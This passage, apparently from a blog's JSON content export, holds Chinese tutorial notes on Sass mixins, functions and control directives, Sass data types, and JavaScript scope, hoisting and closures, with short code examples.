class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.text-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#0ff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.text2-ellipsis</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">    <span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前</span></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> height-light &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#fc0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> head-text &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@mixin</span> computed &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> height-light;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> head-text;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">@include</span> computed</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后</span></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#fc0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-7-函数\"><a href=\"#2-7-函数\" class=\"headerlink\" title=\"2.7 函数\"></a>2.7 函数</h3><ul>\n<li>使用 <code>@fuction funName (param) &#123;&#125;</code> 声明，通过 <code>funName()</code> 调用</li>\n<li>可使用 <code>sass</code> 自带的函数，如 <code>lighten()</code>、<code>darken()</code> 等</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@function</span> addSize (<span class=\"variable\">$size</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$baseSize</span>: <span class=\"number\">12px</span>;</span><br><span class=\"line\">    <span class=\"keyword\">@return</span> <span class=\"variable\">$baseSize</span>+<span class=\"variable\">$size</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-1</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$blue</span>: <span class=\"number\">#00A3CF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: addSize(<span class=\"number\">10px</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: darken(<span class=\"variable\">$blue</span>, <span class=\"number\">25%</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-2</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$blue</span>: <span class=\"number\">#00A3CF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: addSize(<span class=\"number\">10px</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: lighten(<span class=\"variable\">$blue</span>, <span class=\"number\">20%</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.link-1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">22px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#003f50</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.link-2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">22px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#36d4ff</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-8-其他\"><a href=\"#2-8-其他\" class=\"headerlink\" title=\"2.8 其他\"></a>2.8 其他</h3><ul>\n<li>运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格）</li>\n<li>三目运算 条件为真/假时，返回不同的值 （与函数有点类似）</li>\n<li><code>@if</code> 条件成立后执行 <code>&#123;&#125;</code> 内的语句</li>\n<li><code>@each</code> 遍历 <code>list</code> 变量、<code>map</code> 变量</li>\n<li><code>@for</code> 在指定数值范围内遍历</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sass 运算、 @if、三目运算 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"variable\">$hasSubMenu</span>: true;</span><br><span class=\"line\"><span class=\"variable\">$level</span>: <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"selector-class\">.wrapper</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: if(<span class=\"variable\">$hasSubMenu</span>, <span class=\"number\">#f00</span>, <span class=\"number\">#00f</span>);</span><br><span class=\"line\">    <span class=\"keyword\">@if</span> <span class=\"variable\">$hasSubMenu</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&#x27;/images/down-icon.jpg&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@if</span> <span class=\"variable\">$level</span>==<span class=\"number\">2</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">height</span>: <span class=\"number\">60px</span> * <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">@else</span> if <span class=\"variable\">$level</span>==<span class=\"number\">3</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">height</span>: <span class=\"number\">60px</span> * <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.wrapper</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/down-icon.jpg&quot;</span>);</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#f0f</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// @each 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"variable\">$animal-list</span>: puma, sea-slug, egret;</span><br><span class=\"line\"><span class=\"keyword\">@each</span> <span class=\"variable\">$animal</span> in <span class=\"variable\">$animal-list</span> &#123;</span><br><span class=\"line\">    .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&#x27;/images/#&#123;$animal&#125;.png&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.puma-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/puma.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.sea-slug-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/sea-slug.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.egret-icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">&quot;/images/egret.png&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// @for 示例</span></span><br><span class=\"line\"><span class=\"comment\">// 编译前的 scss 文件</span></span><br><span class=\"line\"><span class=\"keyword\">@for</span> <span class=\"variable\">$i</span> from <span class=\"number\">1</span> to <span class=\"number\">4</span> &#123;</span><br><span class=\"line\">    <span class=\"selector-class\">.content-</span>#&#123;<span class=\"variable\">$i</span>&#125; &#123;</span><br><span class=\"line\">        <span class=\"attribute\">font-size</span>: &#123;</span><br><span class=\"line\">            font-size: <span class=\"number\">14px</span> + <span class=\"variable\">$i</span> * <span class=\"number\">2px</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译后的 css 文件</span></span><br><span class=\"line\"><span class=\"selector-class\">.content-1</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.content-2</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.content-3</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Sass 技巧篇","date":"2021-03-23T16:00:00.000Z","_content":"\n### 数据类型\n\n* 数字，1, 2, 13, 10px\n* 字符串，有引号字符串与无引号字符串，\"foo\", 'bar', baz\n* 颜色，blue, #04a3f9, rgba(255,0,0,0.5)\n* 布尔型，true, false\n* 空值，null\n* 数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif\n* maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)","source":"_posts/Sass/Sass 技巧篇.md","raw":"---\ntitle: Sass 技巧篇\ncategories: [CSS, Sass]\ntags: [CSS, Sass]\ndate: 2021-03-24\n---\n\n### 数据类型\n\n* 数字，1, 2, 13, 10px\n* 字符串，有引号字符串与无引号字符串，\"foo\", 'bar', baz\n* 颜色，blue, #04a3f9, rgba(255,0,0,0.5)\n* 布尔型，true, false\n* 空值，null\n* 数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif\n* maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)","slug":"Sass/Sass 技巧篇","published":1,"updated":"2021-04-28T02:29:04.442Z","_id":"cko0u90vb0001qd6racbyegrg","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><ul>\n<li>数字，1, 2, 13, 10px</li>\n<li>字符串，有引号字符串与无引号字符串，”foo”, ‘bar’, baz</li>\n<li>颜色，blue, #04a3f9, rgba(255,0,0,0.5)</li>\n<li>布尔型，true, false</li>\n<li>空值，null</li>\n<li>数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif</li>\n<li>maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><ul>\n<li>数字，1, 2, 13, 10px</li>\n<li>字符串，有引号字符串与无引号字符串，”foo”, ‘bar’, baz</li>\n<li>颜色，blue, #04a3f9, rgba(255,0,0,0.5)</li>\n<li>布尔型，true, false</li>\n<li>空值，null</li>\n<li>数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif</li>\n<li>maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)</li>\n</ul>\n"},{"title":"作用域与闭包","date":"2021-04-27T09:24:48.000Z","_content":"\n# 作用域与闭包\n\n### 1、JavaScript 编译\n\n源代码在执行之前会进行编译，分为三个步骤：\n\n1. 分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元\n2. 解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）\n3. 代码生成：将 AST 转换为可执行代码（一组机器指令）\n\n> JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。\n\n* 引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。\n* 编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。\n* 作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。\n\n> 以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。\n\n### 2. 作用域\n\n作用域：是一套规则，用于确定在何处以及如何查找变量（标识符）\n\n当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。\n\n```js\n// 气泡1 （全局环境）\nfunction foo (a) { // 气泡2\n    var b = a * 2;\n\n    function bar (c) { // 气泡3\n        console.log(a, b, c);\n    }\n}\n\nfoo(2);\n```\n\n* 气泡1包含着整个全局作用域，其中只有一个标识符： foo 。\n* 气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。\n* 气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。\n\n作用域有两种工作模型：词法作用域、动态作用域\n> 词法作用域是在定义时确定的，关注函数在何处声明\n> 动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。\n\n```js\nvar a = 2;\n\nfunction foo() {\n  console.log(a);\n}\n\nfunction bar() {\n  var a = 3;\n  foo();\n}\n\nbar();\n\n// 如果js是词法作用域（就是），那么应该会输出 2\n// 如果js是动态作用域，那么应该会输出 3\n```\n\n### 3、词法作用域\n\n在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。\n\n作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。\n\n在多层的嵌套作用域中可以定义同名的标识符，这叫作**遮蔽效应**（内部的标识符遮蔽了外部的标识符）\n\n> 全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。\n\n在 JavaScript 中词法作用域规则:\n* 函数允许访问函数外的数据\n* 整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域）\n* 作用规则首先使用提升规则分析\n* 通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找\n\n### 4、词法欺骗\n\n##### 4.1 eval\n\nJavaScript 中的 `eval()` 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。`eval()` 在运行期修改了书写期的词法作用域。\n\n换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。`eval()` 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。\n\n```js\nfunction foo(str, a) {\n    eval( str ); // 欺骗！\n    console.log( a, b );\n}\nvar b = 2;\nfoo( \"var b = 3;\", 1 ); // 1, 3\n\n// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量\n```\n\n##### 4.2 with\n\nwith 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。\n\n```js\nfunction foo(obj) {\n    with (obj) {\n        a = 2;\n    }\n}\nvar o1 = { a: 3 };\nvar o2 = { b: 3 };\nfoo( o1 );\nconsole.log( o1.a ); // 2\nfoo( o2 );\nconsole.log( o2.a ); // undefined\nconsole.log( a );    // 2——不好，a 被泄漏到全局作用域上了！\n\n// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，\n// 自动创建了一个全局变量（因为是非严格模式）。\n```\n\n**总结：**\n* eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。\n* with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。   \n* 严格模式下，eval() 和 with 功能受限制\n* 如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。\n\n\n### 5、函数作用域\n\n函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。\n\n立即执行函数表达式：（Immediately Invoked Function Expression）\n\n```js\nvar a = 2;\n(function IIFE(global, undefined) {\n    var a = 3;\n    console.log( a ); // 3\n    console.log( global.a ); // 2\n})(window);\n\nconsole.log( a ); // 2\n\n// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰\n// 解决 undefined 标识符的默认值被错误覆盖导致的异常\n```\n\n### 6、块作用域\n\n块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部）\n\n> let 为其声明的变量隐式地创建了块级作用域\n> 使用块作用域更加主流，也便于开发、维护\n\n\n### 7、变量提升\n\n提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。\n\n* 只有声明本身会被提升，而赋值或其他运行逻辑会留在原地\n* 函数声明会被提升，但是函数表达式却不会被提升\n* 函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量\n* 在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域\n\n以 `var a = 2; `为例，JavaScript 会看做两部分 `var a;` 和 `a = 2;`，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。\n\n\n```js\n// 变量声明会被提升\nfunction foo() {\n    var a;\n    console.log( a ); // undefined\n    a = 2;\n}\nfoo();\n```\n\n```js\n// 函数表达式不会被提升\nfoo(); // 不是 ReferenceError, 而是 TypeError!\nvar foo = function bar() {\n    console.log(12312);\n};\n```\n\n```js\nfoo(); // 1\nvar foo;\nfunction foo() {\n    console.log( 1 );\n}\nfoo = function() {\n    console.log( 2 );\n};\n\n// ----- output -------\n// 输出：1\n// ----- javascript 理解成如下形式 -----\n// function foo() {\n//      console.log( 1 );\n// }\n// foo(); // 1\n// foo = function() {\n//      console.log( 2 );\n// }; \n```\n\n### 8、闭包\n\n概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。\n\n作用：\n1. 变量和对象的私有化\n2. 数据缓存\n3. 模块化\n\n```js\nfunction wait(message) {\n    setTimeout(function timer() {\n        console.log(message);\n    }, 1000);\n}\nwait( \"Hello, closure!\" );\n\n// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。\n// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。\n// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包\n```\n\n> 在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包\n\n### 9、闭包与循环\n\n```js\nfor (var i=1; i<=5; i++) {\n    setTimeout(function timer() {\n        console.log(i);\n    }, i*1000);\n}\n// outupt ----> 6 6 6 6 6\n// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i`\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    (function() {\n        setTimeout(function timer() {\n            console.log( i );\n        }, i*1000);\n    })();\n}\n// outupt ----> 6 6 6 6 6\n// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i`\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    (function() {\n        var j = i;\n        setTimeout(function timer() {\n            console.log( j );\n        }, j*1000);\n    })();\n}\n\nfor (var i=1; i<=5; i++) {\n    (function(j) {\n        setTimeout(function timer() {\n            console.log( j );\n        }, j*1000);\n    })(i);\n}\n// outupt ----> 1 2 3 4 5\n// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    let j = i; // 产生了新的块级作用域！\n    setTimeout(function timer() {\n        console.log(j);\n    }, j*1000);\n}\n\nfor (let i=1; i<=5; i++) {\n    setTimeout(function timer() {\n        console.log(i);\n    }, i*1000);\n}\n// outupt ----> 1 2 3 4 5\n// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, \n//      JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算\n```\n\n```js\n// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域\nfor (let i = 0; i < 3; i++) {\n  let i = 'abc';\n  console.log(i);\n}\n// ------ output ------\n// abc\n// abc\n// abc\n\n```\n\n### 10、闭包与模块\n\n模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API\n\n```js\n// 模块模式\nfunction foo() {\n    var something = \"cool\";\n    var another = [1, 2, 3];\n    function doSomething() {\n        console.log(something);\n    }\n    function doAnother() {\n        console.log(another.join( \" ! \" ));\n    }\n\n    return {\n        doSomething,\n        doAnother\n    }\n}\n```\n\n模块模式的两个必要条件：\n1. 必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。\n2. 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。","source":"_posts/JavaScript/作用域与闭包.md","raw":"---\ntitle: 作用域与闭包\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-04-27 17:24:48\n---\n\n# 作用域与闭包\n\n### 1、JavaScript 编译\n\n源代码在执行之前会进行编译，分为三个步骤：\n\n1. 分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元\n2. 解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）\n3. 代码生成：将 AST 转换为可执行代码（一组机器指令）\n\n> JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。\n\n* 引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。\n* 编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。\n* 作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。\n\n> 以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。\n\n### 2. 作用域\n\n作用域：是一套规则，用于确定在何处以及如何查找变量（标识符）\n\n当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。\n\n```js\n// 气泡1 （全局环境）\nfunction foo (a) { // 气泡2\n    var b = a * 2;\n\n    function bar (c) { // 气泡3\n        console.log(a, b, c);\n    }\n}\n\nfoo(2);\n```\n\n* 气泡1包含着整个全局作用域，其中只有一个标识符： foo 。\n* 气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。\n* 气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。\n\n作用域有两种工作模型：词法作用域、动态作用域\n> 词法作用域是在定义时确定的，关注函数在何处声明\n> 动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。\n\n```js\nvar a = 2;\n\nfunction foo() {\n  console.log(a);\n}\n\nfunction bar() {\n  var a = 3;\n  foo();\n}\n\nbar();\n\n// 如果js是词法作用域（就是），那么应该会输出 